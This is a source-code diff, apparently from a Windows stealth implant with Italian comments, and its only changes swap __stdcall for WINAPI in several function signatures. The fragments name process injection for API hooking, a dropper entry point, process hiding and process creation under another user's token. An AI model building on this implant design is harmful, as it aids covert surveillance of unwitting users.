@@ -211,7 +211,7 @@ typedef DWORD (WINAPI *ZWQUERYSYSTEMINFORMATION)(
 // da Hookare [Threddino]
 // 
 
-typedef void (__stdcall *Sleep_t)(DWORD);
+typedef void (WINAPI *Sleep_t)(DWORD);
 typedef struct
 {
 	HMCommonDataStruct pCommon;
@@ -697,7 +697,7 @@ BOOL MarkProcess(DWORD pid)
 // 
 // Inietta il Thread nel processo da cui effettuare API Hooking
 // Se lookup_bypass==TRUE guarda la process bypass list, altrimenti no
-HANDLE __stdcall HM_sStartHookingThread(DWORD dwPid, DWORD dwThid, BOOL lookup_bypass, BOOL mark_process)
+HANDLE WINAPI HM_sStartHookingThread(DWORD dwPid, DWORD dwThid, BOOL lookup_bypass, BOOL mark_process)
 {
 	HANDLE hThreadRem = INVALID_HANDLE_VALUE;
 	HANDLE hProcess;
@@ -817,7 +817,7 @@ BOOL IsHooked(HANDLE hProc, PBYTE code_local, PBYTE code_remote)
 //
 #define CRETURN(x)	if(x) {CloseHandle(x);return NULL;}
 
-DWORD __stdcall  HM_sCreateHookA(DWORD dwPid, 
+DWORD WINAPI HM_sCreateHookA(DWORD dwPid,
 								 char *APIName, 
 								 char *DLLAPIName, 
 								 BYTE *HookAdd, 
@@ -929,7 +929,7 @@ DWORD __stdcall  HM_sCreateHookA(DWORD dwPid,
 	return pCommonData->dwDataAdd;
 }
 
-void __stdcall HM_sInBundleHook(DWORD dwPid, HMServiceStruct * pServiceData, BOOL lookup_bypass)
+void WINAPI HM_sInBundleHook(DWORD dwPid, HMServiceStruct * pServiceData, BOOL lookup_bypass)
 {
 	// XXX Check ridondante nel caso il padre sia svchost che non ha la lista
 	// perche' non ha la shared
@@ -1048,7 +1048,7 @@ void __stdcall HM_sInBundleHook(DWORD dwPid, HMServiceStruct * pServiceData, BOO
 }
 
 
-void __stdcall HM_sInBundleService(DWORD dwPid, HMServiceStruct *pServiceData)
+void WINAPI HM_sInBundleService(DWORD dwPid, HMServiceStruct *pServiceData)
 {
 	HMMAKE_HOOK(dwPid, NULL, IPCClientRead, IPCClientRead_data, IPCClientRead_setup, NULL, NULL);
 	HMMAKE_HOOK(dwPid, NULL, IPCClientWrite, IPCClientWrite_data, IPCClientWrite_setup, NULL, NULL);
@@ -1470,8 +1470,9 @@ HANDLE GetMediumLevelToken()
 
 // Funzione richiamata dal dropper che sceglie il processo da usare per fare la 
 // CreateProcess e poi la invoca.
-extern "C" void __stdcall HIDING(void);
-void __stdcall HM_RunCore(char *cmd_line, DWORD flags, STARTUPINFO *si, PROCESS_INFORMATION *pi)
+extern "C" void WINAPI HIDING(void);
+
+void WINAPI HM_RunCore(char *cmd_line, DWORD flags, STARTUPINFO *si, PROCESS_INFORMATION *pi)
 {
 	DWORD dummy;
 
@@ -1547,12 +1548,12 @@ void __stdcall HM_RunCore(char *cmd_line, DWORD flags, STARTUPINFO *si, PROCESS_
 
 // Funzione per far eseguire CreateProcess a explorer (o a un altro processo specificato)
 // Se fallisce ritorna 0 come child_pid nella struttura PROCESS_INFORMATION
-void __stdcall HM_CreateProcess(char *cmd_line, DWORD flags, STARTUPINFO *si, PROCESS_INFORMATION *pi, DWORD host_pid)
+void WINAPI HM_CreateProcess(char *cmd_line, DWORD flags, STARTUPINFO *si, PROCESS_INFORMATION *pi, DWORD host_pid)
 {
 	HM_CreateProcessAsUser(cmd_line, flags, si, pi, host_pid, NULL);
 }
 
-void __stdcall HM_CreateProcessAsUser(char *cmd_line, DWORD flags, STARTUPINFO *si, PROCESS_INFORMATION *pi, DWORD host_pid, HANDLE hToken)
+void WINAPI HM_CreateProcessAsUser(char *cmd_line, DWORD flags, STARTUPINFO *si, PROCESS_INFORMATION *pi, DWORD host_pid, HANDLE hToken)
 {
 	HMCreateProcessThreadDataStruct HMCreateProcessThreadData;
 	HMODULE hMod;
@@ -2281,7 +2282,7 @@ void DeletePending()
 }
 
 // Main del core
-void __stdcall HM_sMain(void)
+void WINAPI HM_sMain(void)
 {
 	PID_HIDE pid_hide;
 
